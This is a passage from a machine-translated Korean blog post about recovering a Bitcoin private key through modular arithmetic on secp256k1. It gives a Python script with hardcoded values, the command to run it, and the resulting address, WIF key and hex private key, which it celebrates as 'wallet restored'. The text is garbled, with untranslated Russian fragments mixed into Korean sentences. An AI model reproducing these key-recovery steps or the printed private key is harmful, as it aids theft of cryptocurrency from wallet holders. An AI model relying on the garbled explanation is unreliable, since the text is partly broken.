<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0465304D24C0EDC862843587A96EA700F86E9E70E7801AC7DF9EFD2DE84230C3E77AF6D83573849D2368A021E835C5768E1B791C0C1B4CFAFB9795058DF5F27958
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>개인 키에 주의하십시오.</h3>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/f8d/aae/bb6/f8daaebb61f7ee1e398441c85ab85209.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>후자는&nbsp;공개&nbsp;<em>키&nbsp;</em><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener">"Maxwell의 허영 공개 키"</a><code>8 цифр</code>&nbsp;와 일치합니다 .<code>формате HEX</code><em></em><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0200000000000000000000003B78CE563F89A0ED9414F5AA28AD0D96D6795F9C63</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>A = 0x00000000000000000000000000000000000000000000000000000000795f9c63
B = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>이제 3개의 비트코인 ​​주소 중 하나에 대한 개인 키를 얻으려면&nbsp;<code>значение A</code>다음과 같이 모듈로 분할을 수행해야 합니다.<code>значение B</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Privkey = ((A * modinv(B,N)) % N)</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><em>파이썬</em>&nbsp;스크립트를 사용해 봅시다&nbsp;:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m

N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

A = 0x00000000000000000000000000000000000000000000000000000000795f9c63
B = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae


print (h(((A) * modinv(B,N)) % N))
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><em>Python</em>&nbsp;스크립트(&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py)</a>&nbsp;를 실행해 봅시다.<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/calculate.py" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/750/f71/837/750f71837b11f35eb3f067cc0499c558.png" alt="결과적으로 HEX 형식의 터미널에서 개인 키를 받게 됩니다." title="결과적으로 HEX 형식의 터미널에서 개인 키를 받게 됩니다."/><figcaption class="wp-element-caption">결과적으로 HEX 형식의 터미널에서 개인 키를 받게 됩니다.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm
WIF:  5JF9ME7zdGLDd3oyuMG7RfwgA1ByjZb2LbSwRMwM8ZKBADFLfCx
HEX:  38717b5161c2e817020a0933e1836dd0127bdef59732d77daca20ccfbf61a7ae</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/eb4/d76/c11/eb4d76c11de49bd6114bcb2b5409cdc4.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>개인 키 발견!</h2>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2>비트코인 지갑 복원!</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/d05/dfb/7d1/d05dfb7d1f9a7217cf7f88bd11b969e7.png" alt="www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm" title="www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm"/><figcaption class="wp-element-caption">www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>&nbsp;이 비디오는 암호 화폐의&nbsp;&nbsp;&nbsp;약한 서명에 대한&nbsp;&nbsp;&nbsp;타원 곡선의 데이터 및 암호화의 재정적 보안을 보장하기 위해&nbsp;&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener"><strong>CRYPTO DEEP TECH</strong></a>&nbsp;포털용 으로 제작되었습니다.&nbsp;<code>secp256k1</code><code>ECDSA</code><code>BITCOIN</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/08ReducePrivateKey" target="_blank" rel="noreferrer noopener"><strong>원천</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://t.me/cryptodeeptech"><strong>텔레그램</strong></a><strong>&nbsp;:&nbsp;&nbsp;</strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"><strong><u>https://t.me/cryptodeeptech</u></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/zu2yiaZ_LOs" target="_blank" rel="noreferrer noopener"><strong>동영상: https://youtu.be/zu2yiaZ_LOs</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/reduce-private-key"><strong>출처:&nbsp;</strong></a><a href="https://cryptodeep.ru/reduce-private-key" target="_blank" rel="noreferrer noopener"><strong>https://cryptodeep.ru/reduce-private-key</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2410} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/03/012-1024x576.png" alt="Уменьшение приватного ключа через скалярное умножение используем библиотеку ECPy + Google Colab" class="wp-image-2410"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">암호해독</a></p>
<!-- /wp:paragraph -->
